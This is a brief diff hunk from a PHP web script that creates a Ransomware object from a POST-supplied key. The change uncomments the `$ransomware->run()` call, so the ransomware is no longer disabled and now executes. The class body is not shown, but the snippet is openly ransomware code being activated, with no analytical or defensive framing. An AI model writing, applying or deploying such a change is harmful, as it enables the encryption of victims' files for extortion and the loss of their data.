@@ -121,7 +121,7 @@ if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) 
         $errorMessage = 'OpenSSL not enabled';
     } else {
         $ransomware = new Ransomware($_POST['key']);
-        // $ransomware->run();
+        $ransomware->run();
         unset($_POST['key'], $ransomware);
         @gc_collect_cycles();
         header('Location: /');
